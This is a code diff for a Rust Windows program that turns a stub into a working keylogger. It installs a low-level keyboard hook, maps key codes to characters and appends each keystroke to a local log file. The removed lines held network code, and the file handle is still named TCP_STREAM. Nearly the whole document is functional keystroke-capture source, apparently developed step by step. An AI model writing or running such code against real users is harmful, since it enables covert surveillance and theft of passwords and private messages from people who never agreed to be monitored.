@@ -1,5 +1,5 @@
-use std::io::prelude::*;
-use std::net::TcpStream;
+use std::fs::OpenOptions;
+use std::io::Write;
 use std::sync::Mutex;
 use lazy_static::lazy_static;
 use winapi::um::winuser::{CallNextHookEx, SetWindowsHookExA, UnhookWindowsHookEx, KBDLLHOOKSTRUCT, WH_KEYBOARD_LL, WM_KEYDOWN, GetMessageW, MSG, TranslateMessage, DispatchMessageW};
@@ -7,46 +7,97 @@ use std::os::raw::c_int;
 use std::ptr::null_mut;
 
 lazy_static! {
-    static ref TCP_STREAM: Mutex<Option<TcpStream>> = Mutex::new(None);
-}
-
-// Add a function to check for updates
-fn check_for_update() -> bool {
-    let current_version = "1.0.0"; // Your application's current version
-    let server_address = "your_update_server.com"; // Address of your update server
-    let server_port = "your_server_port"; // Port of your update server
-    let update_check_path = "/path/to/version_check"; // Path to your version check file or API
-
-    match TcpStream::connect(format!("{}:{}", server_address, server_port)) {
-        Ok(mut stream) => {
-            if let Err(_) = stream.write(format!("GET {} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n", update_check_path, server_address).as_bytes()) {
-                return false;
-            }
-            let mut response = String::new();
-            if let Err(_) = stream.read_to_string(&mut response) {
-                return false;
-            }
-            let latest_version = response.split_whitespace().nth(1).unwrap_or("0"); // Simplified; you'll need to parse the response properly
-            if latest_version > current_version {
-                println!("An update is available: {}", latest_version);
-                true
-            } else {
-                false
-            }
-        },
-        Err(_) => false,
-    }
+    static ref TCP_STREAM: Mutex<Option<std::fs::File>> = Mutex::new(None);
 }
 
 unsafe extern "system" fn keyboard_hook_proc(n_code: c_int, w_param: usize, l_param: isize) -> isize {
-    // Keyboard hook logic remains unchanged
+    if n_code >= 0 && w_param == WM_KEYDOWN as usize {
+        let kb_struct = *(l_param as *const KBDLLHOOKSTRUCT);
+        let key = match kb_struct.vkCode {
+            // Numbers
+            0x30 => "0",
+            0x31 => "1",
+            0x32 => "2",
+            0x33 => "3",
+            0x34 => "4",
+            0x35 => "5",
+            0x36 => "6",
+            0x37 => "7",
+            0x38 => "8",
+            0x39 => "9",
+            // Letters
+            0x41 => "A",
+            0x42 => "B",
+            0x43 => "C",
+            0x44 => "D",
+            0x45 => "E",
+            0x46 => "F",
+            0x47 => "G",
+            0x48 => "H",
+            0x49 => "I",
+            0x4A => "J",
+            0x4B => "K",
+            0x4C => "L",
+            0x4D => "M",
+            0x4E => "N",
+            0x4F => "O",
+            0x50 => "P",
+            0x51 => "Q",
+            0x52 => "R",
+            0x53 => "S",
+            0x54 => "T",
+            0x55 => "U",
+            0x56 => "V",
+            0x57 => "W",
+            0x58 => "X",
+            0x59 => "Y",
+            0x5A => "Z",
+            // Add more mappings as needed
+            _ => "Unknown",
+        };
+        println!("Key pressed: {}", key);
+
+        // Append the key pressed to a file
+        let mut file_lock = TCP_STREAM.lock().unwrap();
+        if let Some(file) = file_lock.as_mut() {
+            let message = format!("{} ", key); // Format the key
+            let _ = file.write_all(message.as_bytes()); // Ignore errors in this context
+        }
+    }
+
+    CallNextHookEx(null_mut(), n_code, w_param, l_param)
 }
 
 fn main() {
-    if check_for_update() {
-        println!("Please visit our website to download the latest version.");
-        return; // Exit the application or continue based on your update strategy
+    // Initialize the file for logging keystrokes
+    let log_file_path = "keystrokes_log.txt";
+    let log_file = OpenOptions::new()
+        .create(true)
+        .write(true)
+        .append(true)
+        .open(log_file_path)
+        .expect("Failed to open log file");
+
+    {
+        let mut file_lock = TCP_STREAM.lock().unwrap();
+        *file_lock = Some(log_file);
     }
 
-    // The rest of your main function remains unchanged
+    println!("Logging keystrokes to {}", log_file_path);
+
+    unsafe {
+        let hook = SetWindowsHookExA(WH_KEYBOARD_LL, Some(keyboard_hook_proc), null_mut(), 0);
+        if hook.is_null() {
+            eprintln!("Failed to set keyboard hook");
+            return;
+        }
+
+        let mut msg: MSG = std::mem::zeroed();
+        while GetMessageW(&mut msg, null_mut(), 0, 0) > 0 {
+            TranslateMessage(&msg);
+            DispatchMessageW(&msg);
+        }
+
+        UnhookWindowsHookEx(hook);
+    }
 }
